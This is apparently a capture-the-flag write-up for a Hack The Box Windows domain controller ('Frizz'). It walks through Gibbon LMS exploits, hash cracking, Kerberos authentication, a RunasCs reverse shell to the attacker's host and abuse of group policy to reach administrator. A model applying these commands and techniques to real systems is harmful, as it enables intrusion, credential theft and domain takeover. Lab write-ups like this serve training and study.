![image](https://github.com/user-attachments/assets/70b1ea4a-d961-4073-85bc-b5c066e9167f)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration:

## Port Scan:

I began with a port and service scan using `rustscan`, which revealed several open ports on the target host:

```
rustscan -a 10.10.11.60 -- -sC -sV -T4 -oN frizz_nmap
```

![image](https://github.com/user-attachments/assets/05efb156-4c5c-4394-902c-50ffcb19188e)

```Rust
PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-04-13 20:17:58Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49415/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the scan results, I identified a domain `frizz.htb` along with a subdomain `frizzdc.frizz.htb`. I promptly added both to my `/etc/hosts` file for further enumeration.

## Web enumeration:

Next, I browsed to the website `frizz.htb`, but was immediately redirected to `frizzdc.frizz.htb`. To confirm this behavior, I used `curl` to check the headers and observed the HTTP redirection in action:

![image](https://github.com/user-attachments/assets/3084e2cb-4b4e-45f4-ad88-d474e25c6951)

Visiting the redirected site revealed what appeared to be an "Elementary School Website":

![image](https://github.com/user-attachments/assets/50e38235-19c3-4bb8-b3fa-a70aa13c1e2d)

I checked the page source but didn't find anything initially. However, there was a small snippet of Base64-encoded text embedded within a section of the site. Decoding it revealed this message:

![image](https://github.com/user-attachments/assets/9742f5b0-580a-4dc2-9c3e-613996ee50a6)

```
Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.
```

Moving forward, I launched a sub-directory enumeration scan on `frizzdc.frizz.htb` using `dirsearch`. While most results were uneventful, I came across a directory responding with a 500 error—`/cgi-bin/printenv.pl`, which seemed interesting:

![image](https://github.com/user-attachments/assets/36e267af-f198-47ed-b20f-59545289c4d8)

Accessing this path revealed some server error info, and notably, I was able to see the server administrator’s name in the response.

![image](https://github.com/user-attachments/assets/55166d1e-3267-445b-86a6-1b381ac30552)

## Gibbon enumeration:

Next, when I clicked on the login page, I was redirected to a **Gibbon LMS** login portal. Gibbon is an open-source school management system commonly used in educational environments.

![image](https://github.com/user-attachments/assets/5340066e-8a33-44b0-93a3-b3fa83774cad)

I tried a few default credentials like `admin:admin`, but none of them worked. To dig deeper, I performed another round of directory enumeration on the Gibbon login page using `dirsearch`.

![image](https://github.com/user-attachments/assets/36c44a4a-8f40-4496-abe4-61443524f16d)

I reviewed all the discovered directories, but unfortunately, nothing stood out as helpful for gaining initial access.

### LFI in Gibbon:

Moving ahead, I began searching for unauthenticated exploits related to the Gibbon application and came across a **Local File Inclusion (LFI)** vulnerability: [CVE-2023-34598](https://github.com/maddsec/CVE-2023-34598).

Following the PoC from GitHub, I tested it by including `gibbon.sql`, and it successfully returned the contents of the SQL schema.

![image](https://github.com/user-attachments/assets/e9799e12-df3a-4990-af0f-16beb85afea9)

The output, however, was massive and difficult to analyze manually—and unfortunately, it didn’t leak any passwords or sensitive credentials.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initial access:

AContinuing my research, I discovered a critical vulnerability in the Gibbon application: an unauthenticated arbitrary file write, caused by the endpoint `rubrics_visualise_saveAjax.php` not enforcing authentication checks.

I found a working [Proof of Concept on GitHub](https://github.com/davidzzo23/CVE-2023-45878/tree/main), cloned the repository, and reviewed the exploit code.

To verify code execution, I ran the PoC with a simple `whoami` command:

```
python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c 'whoami'
```

As a result, I confirmed that the application was running as the frizz\w.webservice user:

![image](https://github.com/user-attachments/assets/d2fcb9e6-a229-4387-a3f0-a3ef78b66c7d)

After confirming remote code execution, I spun up a **Villian C2** listener on my Kali host and generated a PowerShell payload. Executing this payload from the exploit successfully established a callback, giving me an active session on the box:

![image](https://github.com/user-attachments/assets/11fde4ce-b727-4f62-baee-c8e6626dbf58)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movement

## Situational Awareness:

To explore possibilities for lateral movement, I first assessed the current user's privileges using the `whoami /all` command. Unfortunately, the user (`frizz\w.webservice`) lacked any special permissions or group memberships that could assist in pivoting to another user or host:

![image](https://github.com/user-attachments/assets/bb1d2d46-dcd3-421b-a7f6-f8a989b6c434)

Next, I attempted to browse into the `C:\Users` directory to check other user profiles, but access was denied due to permission restrictions.

To identify valid user accounts on the system, I ran the `net user` command, which revealed several existing users:

![image](https://github.com/user-attachments/assets/3172b0b7-d2f1-43b7-aa40-c48146d646a8)

While enumerating the application files under `C:\xampp\htdocs\Gibbon-LMS`, I rechecked the `config.php` file—this file was previously inaccessible through the LFI vulnerability. Now, with local access, I was able to read its contents, and discovered **MySQL credentials** embedded in the configuration.

![image](https://github.com/user-attachments/assets/25845e87-9a98-4fa5-8027-42c0f463c6fb)

## User Flag (w.webservice → f.frizzle)

After retrieving the MySQL credentials from the `config.php` file, I navigated to the `C:\xampp\mysql\bin directory`, which contains the `mysql.exe` binary, allowing direct interaction with the database.

Using the following command, I successfully authenticated to the `gibbon` database:

```
.\mysql.exe -u MrGibbonsDB -D gibbon -p
```

Upon login, I was able to list and explore the database tables:

![image](https://github.com/user-attachments/assets/8b4b0fdc-c5a2-4de2-ac1f-5bdd3aa8fe20)

Among the numerous tables, I found useful information inside the `gibbonPerson` table. It contained usernames, hashed passwords, and salts. Specifically, I identified credentials for the user `f.frizzle`:

![image](https://github.com/user-attachments/assets/69ab00c2-0312-4d61-b374-87af9db38191)

## Hash-crack:

Moving forward, I analyzed the hash extracted from the `gibbonPerson` table using the tool haiti, which identified the format as SHA-256.

![image](https://github.com/user-attachments/assets/7c833a18-aff9-43f8-9d85-f439039fe284)

I attempted to crack the hash using both **John the Ripper** and **Hashcat**, with and without applying the salt, but initially had no success. I then referred to Hashcat’s example hashes and modified my approach by appending the salt to the hash, trying different cracking modes.

![image](https://github.com/user-attachments/assets/88cd5ebe-faa9-4cfa-ac42-2afe75f3e357)

Eventually, Hashcat **mode 1420** (SHA-256 with salt appended) yielded results, and I was able to recover the plaintext password successfully:

![image](https://github.com/user-attachments/assets/4d158ace-9e52-4d72-874f-45eeb0461f3f)

## TGT of f.frizzle:

After retrieving the cleartext credentials for `f.frizzle`, I attempted authentication using `netexec`. However, standard **NTLM** authentication failed in this case:

![image](https://github.com/user-attachments/assets/d154effe-e2a2-4d20-9992-21f36736b49c)

To work around this, I tried authenticating over **Kerberos** by appending the `-k` flag, which switches the authentication method from NTLM to Kerberos. This time, I encountered a different error — a common **clock skew** issue related to Active Directory time synchronization:

![image](https://github.com/user-attachments/assets/3283b656-a0ed-4b62-8cae-7fa5093d0c12)

To resolve this, I synchronized the system time with the domain controller by running:

```
sudo ntpdate server frizzdc.frizz.htb
```

![image](https://github.com/user-attachments/assets/8e4513da-f43e-4016-9a80-ea15759ac812)

After syncing the clock, I retried the `netexec` command — this time it worked as expected:

![image](https://github.com/user-attachments/assets/d6ea46ed-65d8-4443-a7cf-553f8af121c4)

With the credentials confirmed valid, I used Impacket’s `getTGT.py` to request a TGT (Ticket Granting Ticket) for `f.frizzle` and exported it to my current shell session:

```
getTGT.py frizz.htb/'f.frizzle':'J***********' -dc-ip 10.10.11.60

export KRB5CCNAME=f.frizzle.ccache
```

![image](https://github.com/user-attachments/assets/efc20acb-293d-48ba-8202-33e909db2549)

## Shell as F.Frizzle:

Although I resolved the time synchronization issue, this method did not work with **WinRM**. Despite `f.frizzle` having the appropriate privileges for **Remote Management Users**, I couldn't authenticate, as port 5985 (WinRM) was closed:

![image](https://github.com/user-attachments/assets/fe43ca4d-3cb2-4427-b0e0-3a8d0527fdd8)

Since I had valid credentials, I decided to try a different lateral movement technique using a tool called [**RunasCs**](https://github.com/antonioCoco/RunasCs). RunasCs is a utility that allows you to execute specific processes with different permissions than the current user's credentials. It is useful when there are restrictions on the default logon type.

I transferred the RunasCs tool to the target host and executed it with `f.frizzle` credentials, while also leveraging my Villian C2 reverse shell to establish the connection:

![image](https://github.com/user-attachments/assets/56041d75-76e4-4e5c-8c24-a4703896db63)

Upon successful exploitation, I immediately got a session back on the C2, with the user context of `f.frizzle`:

![image](https://github.com/user-attachments/assets/faaee065-3a9c-47fe-b062-437a8f81fad6)

However, there were some issues with the session, likely caused by restrictions on the logon type for the user. These restrictions prevented me from fully pivoting into the `f.frizzle` account:

![image](https://github.com/user-attachments/assets/64e79d6f-4116-4364-937f-bc11232645f5)

### SSH as F.Frizzle:

Since the RunasCs method didn’t work, I shifted my focus to **SSH** login. However, I encountered errors when attempting to authenticate:

![image](https://github.com/user-attachments/assets/794b9a43-924f-4b5a-b79b-f830194aca38)

Given that NTLM authentication failed with SMB and LDAP, I assumed the same might apply to SSH. To perform Kerberoas authentication via SSH, I referred to online resources and adjusted my approach accordingly.

First, I created a **Kerberos configuration** file at `/etc/krb5.conf`, containing the necessary domain and DC details:

```
[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB

[libdefaults]
    default_realm = FRIZZ.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    FRIZZ.HTB = {
        kdc = FRIZZDC.FRIZZ.HTB
        admin_server = FRIZZDC.FRIZZ.HTB
        default_domain = FRIZZ.HTB
    }
```

After configuring the `krb5.conf` file, I used **kinit** to request the **TGT** for `f.frizzle`:

```
kinit f.frizzle@FRIZZ.HTB
```

Although I had already obtained the TGT via Impacket's `getTGT.py`, it didn’t work in this scenario. Upon further investigation, I learned that **kinit** is more reliable for SSH and GSSAPI operations, while **getTGT.py** is geared more toward raw Kerberos operations and may lack full compatibility for these use cases.

Once I successfully obtained the TGT using **kinit**, I attempted to SSH again, and this time, I successfully logged in as `f.frizzle` and retrieved the user flag:🙂

![image](https://github.com/user-attachments/assets/78167c1e-36a5-4e98-82f0-86ad4532183e)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation:

Once I had SSH access as `F.frizzle`, I executed a **Villian C2** reverse shell to establish a second connection to my C2.

I then checked the privileges of `F.frizzle`, but didn't observe anything particularly useful for privilege escalation at that point:

![image](https://github.com/user-attachments/assets/2977d95e-4891-4d34-8e3b-81334aa526c4)

## Bloodhound:

At this stage, I decided to gather more information about the Active Directory (AD) objects and their associated permissions by running **BloodHound**. Initially, I attempted to run **bloodhound-python** directly from my Kali host, but after several retries, I wasn't able to get it working as expected.

To overcome this, I uploaded the **SharpHound** binary directly to the target host and executed it to collect the necessary data. Once the collection was completed, I tried several methods to download the resulting file:

- **SMBv2** didn't work.
- **SCP** also failed.

Finally, I resorted to using **Metasploit** for the file transfer. I created a **MSF payload**, uploaded it to the target host, and set up a listener on **msfconsole**. After executing the payload on the target host, I immediately received a reverse connection back to my listener, from which I successfully downloaded the **SharpHound** collection file.

![image](https://github.com/user-attachments/assets/373534f3-ab6a-4c89-85b2-1b5a17f7c899)

With the **SharpHound** data downloaded, I uploaded it to **BloodHound** for analysis. However, despite checking for possible attack paths for `F.frizzle` to escalate to **Domain Admin**, I couldn't find any direct paths:

![image](https://github.com/user-attachments/assets/80ee46f0-a13f-4308-8e56-03a40fe22833)


## F.frizzle -> M.schoolbus

Since BloodHound didn’t reveal any viable paths to escalate privileges, I went back to manual host enumeration to search for anything that could help in privilege escalation.

During the process, I came across two 7zip archives located inside the `$RECYCLE.BIN` directory:

![image](https://github.com/user-attachments/assets/8bdb3e60-09af-4afd-a8ce-f6aa128aa25a)

After some trial and error—particularly with setting up and reconnecting the **Metasploit** session—I finally managed to download both zip files to my local machine.

Upon extracting the archives, I noticed that the contents appeared to belong to a **WAPT server**. Within its configuration file, I discovered a **Base64-encoded secret**:

![image](https://github.com/user-attachments/assets/e1c2b99b-f5ac-47b8-8ab6-af45d58d3994)

Decoding the base64 string revealed clear-text credentials:

![image](https://github.com/user-attachments/assets/d199a8d1-d756-4429-bd43-b96f9c40125b)

I then performed a **password spray** across the known list of domain users, and confirmed that the credentials were valid for the user `M.SchoolBus`:

![image](https://github.com/user-attachments/assets/df93f80d-b333-4613-b7cf-cbb08ffcbb88)


## M.SchoolBus -> Administrator

After gaining access as `M.SchoolBus`, I revisited the BloodHound analysis and noticed something critical—this user is a member of the **Group Policy Owners** group. This group membership allows modification of **Group Policy Objects (GPOs)** across the domain:

![image](https://github.com/user-attachments/assets/b8d378fa-3e2d-44d8-9157-80190e8a9349)

Knowing that GPO modifications can be abused for privilege escalation, I started exploring viable attack paths. I found a tool on GitHub called [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), which allows abuse of GPO edit rights to compromise systems linked to that GPO.

However, in order to perform this attack, I needed a GPO that was owned by `M.SchoolBus`. So, I created a new GPO and linked it to the **Domain Controllers** OU using the following PowerShell command:

```
New-GPO -Name dawn | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

![image](https://github.com/user-attachments/assets/73d760f9-c550-4301-831e-ed32f02a8935)

Once the GPO named `dawn` was created and linked, I used `SharpGPOAbuse` to add the `M.SchoolBus` user to the **local Administrators** group on systems affected by that GPO:

```
.\sharp.exe --AddLocalAdmin --UserAccount "M.SchoolBus" --GPOName "dawn"
```

![image](https://github.com/user-attachments/assets/00ad2e52-60d6-4386-bb0b-79aeb54e8100)

To apply the new policy, I forced a group policy update on the target:

```
gpupdate /force
```
![image](https://github.com/user-attachments/assets/3d3dd9e5-41e2-4f18-a009-719e19436a18)

Once the GPO was successfully updated, I checked the local Administrators group—and confirmed that `M.SchoolBus` had been added:

![image](https://github.com/user-attachments/assets/84a13f2a-0123-496e-b771-047ad88b234d)

### Root flag:

After elevating `M.SchoolBus` to local administrator, I proceeded to dump the SAM hashes using `netexec`. This successfully returned the Administrator’s NTLM hashes:

![image](https://github.com/user-attachments/assets/f42e9076-2b5e-41b8-9d98-51c67be8d852)

I attempted a `Pass-the-Hash` attack via **psexec**, but was unsuccessful—other typical techniques likewise failed, likely due to instability in the environment.

Because the machine was unstable and my SSH connection as `M.SchoolBus` kept dropping, I fell back to my existing session as `F.Frizzle`. From there, I used **RunAsCs.exe** again—this time supplying `M.SchoolBus’s` credentials—to spawn a new cmd.exe shell back to my listener:

```
.\RunasCs.exe m.schoolbus '*********' cmd.exe -r 10.10.14.45:1337
```

Within moments, I received a shell as `M.SchoolBus`:

![image](https://github.com/user-attachments/assets/20aa5447-6adf-4782-8fc6-23c7ec14f414)

Finally, with local admin rights on the box, I navigated to the **Administrator’s Desktop** and retrieved the root flag. (pwn3d!🎉)🙂
